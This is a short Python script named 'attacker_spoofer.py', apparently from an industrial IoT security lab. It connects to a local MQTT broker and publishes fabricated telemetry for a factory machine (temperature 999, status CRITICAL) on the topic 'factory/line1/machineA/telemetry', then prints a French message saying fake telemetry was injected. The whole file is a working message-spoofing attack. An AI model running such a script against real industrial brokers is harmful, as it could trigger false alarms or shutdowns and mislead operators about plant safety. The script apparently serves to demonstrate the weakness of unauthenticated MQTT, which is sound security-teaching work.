# attacker_spoofer.py

import json
import paho.mqtt.client as mqtt

client = mqtt.Client()

client.connect("127.0.0.1", 1883)

payload = {
    "machine": "machineA",
    "temperature": 999,
    "vibration": 99,
    "status": "CRITICAL"
}

client.publish(
    "factory/line1/machineA/telemetry",
    json.dumps(payload)
)

print("Fausse télémétrie injectée")